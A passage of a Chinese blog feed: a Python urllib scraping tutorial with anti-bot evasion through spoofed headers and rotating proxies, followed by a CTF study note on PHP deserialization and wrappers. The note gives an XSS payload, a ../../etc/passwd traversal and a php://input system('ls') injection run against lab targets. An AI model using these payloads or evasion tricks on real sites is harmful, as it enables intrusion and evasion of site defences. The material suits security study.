title="urlopen函数用法"></a>urlopen函数用法</h2><p>urllib库是python中最基本的网络请求库。可以模仿浏览器的行为，向指定的服务器发送一个请求，并可以保存服务器返回的数据。</p><p>在Python3的urllib库中，所有和网络请求相关的方法，都被集成到<code>urllib.request</code>模块下面了。基本使用栗子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line">resp = request.urlopen(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br><span class="line">print(resp.read())</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200712121120827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>实际上，使用浏览器访问百度，右键查看源代码，会发现，跟上面打印的数据是一样的。也就是说上面三行代码已经帮我将百度首页的全部代码爬下来了。<br><code>urlopen</code>函数的详细介绍：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url:请求的url</span><br><span class="line">data:请求的data，如果设置了这个值，那么将变成post请求。</span><br><span class="line">返回值:返回值是一个http.client.HTTPResponse对象，这个对象是一个类文件句柄对象。有read(size)、 readline、 readlines以及getcode等方法。</span><br></pre></td></tr></table></figure><p>getcode就是获取当前响应的这个状态码。</p><h2 id="urlretrieve函数用法"><a href="#urlretrieve函数用法" class="headerlink" title="urlretrieve函数用法"></a>urlretrieve函数用法</h2><p>这个函数可以方便的将网页上的一个文件保存到本地，以下代码可以非常方便的将百度的首页下载到本地：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line">request.urlretrieve(<span class="string">&#x27;http://www.baidu.com/&#x27;</span>,<span class="string">&#x27;baidu.html&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020071213080144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这个就是爬取下来的baidu页面<br>还可以爬取图片<br>随便找张图片，复制它的地址，然后修改参数，进行爬取<br><img src="https://img-blog.csdnimg.cn/20200712131221612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这是一张鲁班的图片，成功爬取下来了。</p><h2 id="参数解码和解码函数"><a href="#参数解码和解码函数" class="headerlink" title="参数解码和解码函数"></a>参数解码和解码函数</h2><p><code>urlencode</code>函数<br>用浏览器发送请求的时候，如果URL中包含了中文或者其他特殊字符，那么浏览器会自动的给它进行编码。而如果使用代码发送请求，那么就必须手动的进行编码，这个时候就应该使用<code>urlencode</code>函数来实现。<code>urlencode</code>可以把字典数据转换为URL编码的数据。示例代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">data = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;m0re&#x27;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">18</span>,<span class="string">&#x27;great&#x27;</span>:<span class="string">&#x27;hello,world&#x27;</span>&#125;</span><br><span class="line">j4y = parse.urlencode(data)</span><br><span class="line">print(j4y)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=m0re&amp;age=<span class="number">18</span>&amp;great=hello%<span class="number">2</span>Cworld</span><br></pre></td></tr></table></figure><p>还可以这么做<br><img src="https://img-blog.csdnimg.cn/20200712134642641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br><code>parse_qs</code>函数可以将urlencode函数编码过的字符串进行解码<br>如下<br><img src="https://img-blog.csdnimg.cn/20200712135413295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="urlparse和urlsplit"><a href="#urlparse和urlsplit" class="headerlink" title="urlparse和urlsplit"></a><code>urlparse</code>和<code>urlsplit</code></h2><p>有时候拿到一个URL，想要对这个URL中的各个组成部分进行分割，那么这个时候就可以使用<code>urlparse</code>或者是<code>urlsplit</code>来进行分割。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request,parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://www.baidu.com/s?username=zhiliao&#x27;</span></span><br><span class="line">result = parse.urlsplit(url)</span><br><span class="line">print(<span class="string">&#x27;scheme&#x27;</span>,result.scheme)</span><br><span class="line">print(<span class="string">&#x27;netloc&#x27;</span>,result.netloc)</span><br><span class="line">print(<span class="string">&#x27;path&#x27;</span>,result.path)</span><br><span class="line">print(<span class="string">&#x27;query&#x27;</span>,result.query)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200712140303705.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br><code>urlparse</code>和<code>urlsplit</code>基本上是一模一样的，唯一不一样的地方是，<code>urlparse</code>里面多了一个<code>params</code>属性，而<code>urlsplit</code>没有这个属性。比如有一个<code>URL</code>为<code>http://www.baidu.com/s;hello?wd=python&amp;username=abc#1</code>，那么<code>urlparse</code>可以获取到<code>hello</code>，而<code>urlsplit</code>不可以获取到。但是<code>url</code>中的<code>params</code>也用的比较少。</p><h2 id="Request类"><a href="#Request类" class="headerlink" title="Request类"></a>Request类</h2><p>如果想要在请求的时候增加一些请求头，那么必须使用<code>request.Request</code>类来实现。比如要增加一个<code>User-Agent</code>，示例代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://www.xxxxxx.com/zhaopin/Python/?labelWords=label&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">req = request.Request(url,headers=headers)</span><br><span class="line">resp = request.urlopen(req)</span><br><span class="line">print(resp.readlines())</span><br></pre></td></tr></table></figure><p>可以看出也是可以爬取到的<br><img src="https://img-blog.csdnimg.cn/20200712143038154.png" alt="m0re" loading="lazy"><br>然后要记一点就是不加<code>User-Agent</code>的话，爬虫进行爬取的话，是不会得到有用的信息的，可以将上面的代码中的<code>user-Agent</code>去掉试试，如果不加<code>User-Agent</code>网站会轻易的识别出来爬虫，然后不给它爬取有用的信息。</p><p>到那时有些信息是需要爬取js代码才能得到的。比如爬取某网站的职位招聘信息。<br>先找到需要爬取的网站的以下信息：<br><img src="https://img-blog.csdnimg.cn/20200714172731396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>首先找到信息所在的网页，查看请求的URL和请求方式</p><p>其次就是data数据<br><img src="https://img-blog.csdnimg.cn/20200714172919237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>写入代码中去，模仿浏览器访问网页以达到爬取信息的目的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request,parse</span><br><span class="line"></span><br><span class="line"><span class="comment">#url = &#x27;https://www.xxxxx.com/jobs/list_python?labelWords=&amp;fromSearch=true&amp;suginput=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#resp = request.urlopen(url)</span></span><br><span class="line"><span class="comment">#print(resp.read())</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://www.xxxxxx.com/jobs/positionAjax.json?px=default&amp;city=%E5%8C%97%E4%BA%AC&amp;needAddtionalResult=false&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36&#x27;</span> &#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;first&#x27;</span>: <span class="string">&#x27;true&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;pn&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;kd&#x27;</span>: <span class="string">&#x27;python&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">req = request.Request(url, headers=headers, data=parse.urlencode(data).encode(<span class="string">&#x27;utf-8&#x27;</span>), method=<span class="string">&#x27;POST&#x27;</span>)</span><br><span class="line">resp = request.urlopen(req)</span><br><span class="line">print(resp.read())</span><br></pre></td></tr></table></figure><p>爬取某招聘网站的职位信息，。这样已经是初步模型了，但是爬取不到信息，因为目前大多数网站都有反爬机制，所以报出了这样一个错误，其实也不是错误，就是浏览器返回的信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#123;&quot;status&quot;:false,&quot;msg&quot;:&quot;\xe6\x82\xa8\xe6\x93\x8d\xe4\xbd\x9c\xe5\xa4\xaa\xe9\xa2\x91\xe7\xb9\x81,\xe8\xaf\xb7\xe7\xa8\x8d\xe5\x90\x8e\xe5\x86\x8d\xe8\xae\xbf\xe9\x97\xae&quot;,&quot;clientIp&quot;:&quot;42.226.97.244&quot;,&quot;state&quot;:2402&#125;\n&#x27;</span></span><br></pre></td></tr></table></figure><p>这是经过URL编码的，解码一下就是访问的过于频繁，让我们稍后再访问。但是再回到浏览器中访问是完全没有问题的。<br>原因就是反爬虫机制的作用。还是能轻易检查出来我的爬虫，需要模仿的再像一点。加个Referer（同样是去浏览器的开发者界面寻找）<br>有些网站的反爬虫机制比较强，可能加了Referer还是爬取不到有用的信息。</p><p>需要再进行深层次的学习，添加其他验证身份的条件，比如下面将要学习的Cookie。</p><h2 id="ProxyHandler处理器（代理设置）"><a href="#ProxyHandler处理器（代理设置）" class="headerlink" title="ProxyHandler处理器（代理设置）"></a>ProxyHandler处理器（代理设置）</h2><p>很多网站会检测某一段时间某个IP的访问次数(通过流量统计，系统日志等)，如果访问次数多的不像正常人，它会禁止这个IP访问。所以应对方法是设置一些代理服务器，每隔一段时间换一个代理，就算IP地址被禁止，依然可以换个IP继续爬取。<br><code>urllib</code>中通过<code>ProxyHandler</code>来设置代理服务器。<br>前提：</p><ul><li><a href="http://httpbin.org/">http://httpbin.org/</a>这个都可以访问的。这个网站可以方便的查看http请求的一些参数</li><li>一个代理IP<br><img src="https://img-blog.csdnimg.cn/20200715184453382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>尽量选择一个最后验证时间比较近的。<br>代码示例：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://httpbin.org/ip&quot;</span></span><br><span class="line"><span class="comment"># 传入代理</span></span><br><span class="line">handler = request.ProxyHandler(&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;49.70.89.14:9999&quot;</span>&#125;)</span><br><span class="line"><span class="comment"># 使用上面创建的handler构建一个opener</span></span><br><span class="line">opener = request.build_opener(handler)</span><br><span class="line"><span class="comment"># 使用opener去发送一个请求</span></span><br><span class="line">resp = opener.open(url)</span><br><span class="line">print(resp.read())</span><br></pre></td></tr></table></figure><ul><li><p>使用<code>urllib.request.ProxyHandler</code>传入一个代理，这个代理是一个字典，字典的key依赖于代理服务器能够接收的类型，一般是<code>http</code>或者<code>https</code></p></li><li><p>使用上一步创建的<code>headler</code>，以及<code>request.build_opener</code>创建一个<code>opener</code>对象</p></li><li><p>使用上一步创建的<code>opener</code>，调用<code>open</code>函数，发起请求</p></li></ul><p>==注意：==<br>代理需要自己设置有用的代理，我这个只是个免费的，现在可以，不知道明天还行不行，就这样。<br>然后各种报错，emmm，代码没问题，就是配置的问题了</p><p>报错一：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urllib.error.URLError: &lt;urlopen error [Errno <span class="number">11001</span>] getaddrinfo failed&gt;</span><br></pre></td></tr></table></figure><p>这个与请求的URL有关，解决办法就是，把请求的URL原本是单引号包着的，改成双引号就OK了。(上面的代码已经修改)</p><p>报错二：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urllib.error.URLError: &lt;urlopen error [WinError <span class="number">10061</span>] 由于目标计算机积极拒绝，无法连接。&gt;</span><br></pre></td></tr></table></figure><p>这个百度就有，但是有的解决不了，是电脑配置的原因。<br>可参考<br><a href="https://bbs.csdn.net/topics/392282730?list=lz">https://bbs.csdn.net/topics/392282730?list=lz</a><br><a href="http://www.manongjc.com/article/113971.html">http://www.manongjc.com/article/113971.html</a><br>配置问题，不细说了。<br><img src="https://img-blog.csdnimg.cn/20200715190503345.png" alt="m0re" loading="lazy"><br>下面挂几个常用的代理，如需更多请百度。<br>常用的代理有：</p><ul><li>快代理：<a href="http://www.kuaidaili.com/">http://www.kuaidaili.com/</a></li><li><a href="http://www.goubanjia.com/">http://www.goubanjia.com/</a></li><li><a href="http://www.66ip.cn/1.html">http://www.66ip.cn/1.html</a></li><li><a href="http://www.ip3366.net/free/">http://www.ip3366.net/free/</a></li><li><a href="http://www.kxdaili.com/dailiip.html">http://www.kxdaili.com/dailiip.html</a></li><li><a href="https://www.kuaidaili.com/free/">https://www.kuaidaili.com/free/</a></li><li><a href="https://www.xicidaili.com/">https://www.xicidaili.com/</a></li><li><a href="http://www.iphai.com/">http://www.iphai.com/</a></li><li><a href="http://www.89ip.cn/">http://www.89ip.cn/</a></li><li><a href="http://www.proxy360.cn/Region/China">http://www.proxy360.cn/Region/China</a></li><li><a href="http://www.ip181.com/">http://www.ip181.com/</a></li><li><a href="https://premproxy.com/">https://premproxy.com/</a></li><li><a href="http://www.xroxy.com/">http://www.xroxy.com/</a></li><li><a href="http://www.data5u.com/free/">http://www.data5u.com/free/</a><h2 id="Cookie模拟登陆"><a href="#Cookie模拟登陆" class="headerlink" title="Cookie模拟登陆"></a>Cookie模拟登陆</h2>在浏览器中寻找到cookie，加入到爬虫脚本中去。<br><img src="https://img-blog.csdnimg.cn/20200715180716730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>添加到headers中，然后进行爬取。<br>以人人网为例。人人网中，要访问用户的主页进行浏览信息，需要登录才可以，也就是要有cookie信息，如果想用代码的方式访问，就需要有正确的cookie信息才能访问，解决方法有两种：第一种是使用浏览器访问，然后将cookie信息复制下来，放到headers中。（没有账号，懒得注册了）缺点是每次访问都需要从浏览器复制cookie，麻烦。在Python处理Cookie，一般是通过<code>http.cookiejar</code>模块和<code>urllib</code>模块的<code>HTTPCookieProcessor</code>处理器类一起使用。<code>http.cookiejar</code>模块的作用是提供用于存储cookie的对象。而<code>HTTPCookieProcessor</code>处理器主要作用是处理这些cookie对象，并构建handler对象。<h2 id="爬虫自动登录访问授权页面"><a href="#爬虫自动登录访问授权页面" class="headerlink" title="爬虫自动登录访问授权页面"></a>爬虫自动登录访问授权页面</h2><code>http.cookiejar</code>模块<br>该模块主要的类有：CookieJar、FileCookieJar、MozillaCookieJar、LWPCookieJar。这四个类的作用分别如下</li></ul><ol><li><code>CookieJar</code>：管理HTTP cookie值、存储HTTP请求生成的cookie、向传出的HTTP请求添加cookie的对象。整个cookie都存储在内存中，对CookieJar实例进行垃圾回收后cookie也将丢失。</li><li><code>FileCookieJar</code>：从<code>CookieJar</code>派生而来，用来创建<code>FileCookieJar</code>实例，检索cookie信息并将cookie存储到文件中。<code>filename</code>是存储cookie的文件名。<code>delayload</code>为True时支持延迟访问文件，即只有在需要时才读取文件或在文件中存储数据。</li><li><code>MozillaCookieJar</code>：从<code>FileCookieJar</code>派生而来，创建与Mozilla浏览器cookie.txt兼容的<code>FileCookieJar</code>实例。</li><li><code>LWPCookieJar</code>：从<code>FileCookieJar</code>派生而来，创建与libwww-per标准的Set-Cookie3文件格式兼容的<code>FileCookieJar</code>实例。</li></ol><p>先学习到这里，需要消化一下，下次继续学习这个部分——利用爬虫登录登陆访问。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP序列化与反序列化、PHP伪协议</title>
      <link href="/2020/08/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E3%80%81PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>/2020/08/23/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E3%80%81PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<p>最近的比赛都有PHP反序列化的题，于是学习一下。</p><h1 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h1><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>要反序列化，先学习序列化，了解<code>serialize()</code>函数，定义啥的就不复制粘贴了，理解了就好。直接简单明了将通俗点。<br>序列化就是通过使用<code>serialize()</code>函数将一个对象变成可以传输的字符串，比如下面的栗子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $test=<span class="string">&quot;lalala&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$baby=<span class="keyword">new</span> B();<span class="comment">//创建一个对象</span></span><br><span class="line">serialize($baby);<span class="comment">//把这个对象进行序列化</span></span><br></pre></td></tr></table></figure><p>序列化后的到的结果是这个样子的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;baby&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;lalala&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>参数说明：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">O:代表<span class="keyword">object</span></span><br><span class="line"><span class="number">4</span>:代表对象名字长度为<span class="number">4</span>个字符</span><br><span class="line">baby:对象的名字</span><br><span class="line"><span class="number">1</span>:代表对象里面有一个变量</span><br><span class="line">s:数据类型</span><br><span class="line"><span class="number">4</span>:变量名称的长度</span><br><span class="line">test:变量名称</span><br><span class="line">s:数据类型</span><br><span class="line"><span class="number">7</span>:变量值的长度</span><br><span class="line">lalala:变量值</span><br></pre></td></tr></table></figure><h2 id="反序列化unserialize"><a href="#反序列化unserialize" class="headerlink" title="反序列化unserialize()"></a>反序列化unserialize()</h2><p>简单来说：就是把被序列化的字符串还原为对象，然后在接下来的代码中继续使用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$u=unserialize(<span class="string">&quot;O:4:&quot;</span>baby<span class="string">&quot;:1:&#123;s:4:&quot;</span>test<span class="string">&quot;;s:6:&quot;</span>lalala<span class="string">&quot;;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> $u-&gt;test; <span class="comment">//得到的结果是lalala</span></span><br></pre></td></tr></table></figure><h2 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h2><p>序列化和反序列化本身没有问题，但是如果反序列化的内容是用户可以控制的，且后台不正当的使用了PHP中的魔法函数，就会导致安全问题。<br>常见的几个魔法函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__construct()    <span class="comment">//当一个对象创建时被调用</span></span><br><span class="line">__destruct()    <span class="comment">//当一个对象销毁时被调用</span></span><br><span class="line">__toString()   <span class="comment">//当一个对象被当作一个字符串使用</span></span><br><span class="line">__sleep()     <span class="comment">//在对象被序列化之前使用</span></span><br><span class="line">__wakeup()   <span class="comment">//将在序列化之后立即被调用</span></span><br></pre></td></tr></table></figure><p>漏洞举例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> $test = <span class="string">&quot;pikaqiu&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$s = $_GET[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">@$unser = unserialize($a);</span><br></pre></td></tr></table></figure><p>payload<br><code>O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;&#125;</code><br>当输入这个payload时，这个payload是已经序列化的，对象test的值是一个xss弹窗脚本，上面的代码会对payload进行反序列化，然后在对象被销毁时执行魔法函数。执行xss弹窗。<br>下面靶场试验一下。pikachu<br><img src="https://img-blog.csdnimg.cn/20200512232636478.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>在框里输入序列化后的payload。进行提交。<br><img src="https://img-blog.csdnimg.cn/20200512232807445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>成功弹窗。以上是最基础的PHP反序列化。</p><h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><p>PHP支持的伪协议有以下几种</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">file:// — 访问本地文件系统</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure><p><code>allow_url_fopen</code> 和<code>allow_url_include</code>这两个关键配置需要开启相应的服务，才能使用相关函数对伪协议的支持，配置相关在<code>php.ini</code>文件中</p><h1 id="php-协议"><a href="#php-协议" class="headerlink" title="php://协议"></a>php://协议</h1><p><code>php://</code>是用来访问各个输入、输出流的。<br>在<code>php://</code>下还有许多子协议</p><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p><code>php://input</code>代表可以访问请求的原始数据，简单来说POST请求的情况下，<code>php://input</code>可以获取到post的数据。<br><code>php://output</code> 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p><h3 id="php-input例题-ctf-show-web3"><a href="#php-input例题-ctf-show-web3" class="headerlink" title="php://input例题(ctf.show) web3"></a>php://input例题(ctf.show) web3</h3><p><img src="https://img-blog.csdnimg.cn/20200520132844443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>首先提示是文件包含漏洞，构造payload</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://<span class="number">537363</span>ba<span class="literal">-ba6d</span><span class="literal">-47cf</span><span class="literal">-b6f4</span><span class="literal">-85e7986ffa04</span>.chall.ctf.show/?url=../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>etc和passwd这两个是linux系统中的文件。至于为什么构造这个，我不是很清楚，看过linux入门书籍，所以多少知道一点，《linux就该这样学》已看完。博客后续发。<br><img src="https://img-blog.csdnimg.cn/20200520134105138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后就是伪协议，构造</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://<span class="number">537363</span>ba<span class="literal">-ba6d</span><span class="literal">-47cf</span><span class="literal">-b6f4</span><span class="literal">-85e7986ffa04</span>.chall.ctf.show/?url=php://input</span><br></pre></td></tr></table></figure><p>抓包，到Repeater。自己构造相关命令执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&quot;ls&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ls是linux系统中列出当前目录下的文件的命令。至于system是有关一个命令执行漏洞，在我的学习命令执行漏洞的博客中有记录。<br><img 